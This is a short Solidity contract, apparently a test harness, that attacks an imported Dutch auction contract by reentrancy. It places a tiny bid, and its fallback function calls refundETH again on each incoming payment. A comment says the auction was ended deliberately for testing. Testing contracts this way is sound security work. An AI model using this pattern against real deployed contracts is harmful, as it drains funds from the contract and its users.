// SPDX-License-Identifier: MITRe Entry Attack

pragma solidity ^0.8.21;

import "./Dutch_Auction.sol";

contract ReEntrancyAttack {
    Dutch_Auction target;

    constructor(address payable _target) {
        target = Dutch_Auction(_target);
    }
            
    function ReentranceAttack1() public payable {
        target.addBidder{value: 0.000000000000001 ether}();
    }

//deliberatily end auction to test
    fallback() external payable {
        target.refundETH();
    }

    receive() external payable {}
}